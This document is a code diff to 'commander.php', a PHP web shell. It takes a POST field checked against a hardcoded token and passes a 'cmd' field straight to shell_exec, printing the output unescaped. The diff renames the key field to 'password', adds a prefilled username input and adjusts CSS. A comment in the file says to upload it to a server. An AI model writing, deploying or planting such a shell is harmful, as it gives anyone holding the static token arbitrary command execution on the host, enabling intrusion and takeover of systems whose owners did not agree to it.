@@ -1,13 +1,14 @@
 <?php
     # change this token before uploading commander.php to the server
     # it helps you on secure and private usage
+    $username = "commander";
     $token = "d98234hf9";
 
     $cmd = "";
     $key = "";
     $ret = "";
-    if(isset($_POST['key']) && $_POST['key'] == $token && isset($_POST['cmd'])){
-        $key = $_POST['key'];
+    if(isset($_POST['password']) && $_POST['password'] == $token && isset($_POST['cmd'])){
+        $key = $_POST['password'];
         $cmd = $_POST['cmd'];
         $ret = shell_exec($cmd);
     }
@@ -41,16 +42,15 @@
             padding: 5px 10px;
             letter-spacing: 2px;
             margin-bottom: 10px;
+            color: yellow;
         }
 
-        .prompt #key{
-            width: 300px;
-            color: yellow;
+        .prompt #key,.prompt #username{
+            width: 210px;
         }
 
         .prompt #command{
             width: 500px;
-            color: yellow;
         }
 
         .prompt .button{
@@ -65,12 +65,15 @@
             font-weight: 600;
             font-family: Arial;
         }
+        #username{
+        }
     </style>
 </head>
 <body>
     <div class="result"><pre><?= $ret ?></pre></div>
     <form class="prompt" method="post">
-        <input class="field" id="key" autocomplete="false" type="password" placeholder="KEY" name="key" value="<?= $key ?>"/><br>
+        <input class="field" type="text" id="username" name="username" value="<?= $username ?>" placeholder="USER"/>
+        <input class="field" id="password" name="password" autocomplete="false" type="password" placeholder="KEY" value="<?= $key ?>"/><br>
         <input class="field" id="command" type="text" placeholder="COMMAND" name="cmd" autofocus value="<?= $cmd ?>"/>
         <input class="button" type="submit" value="Execute" />
     </form>
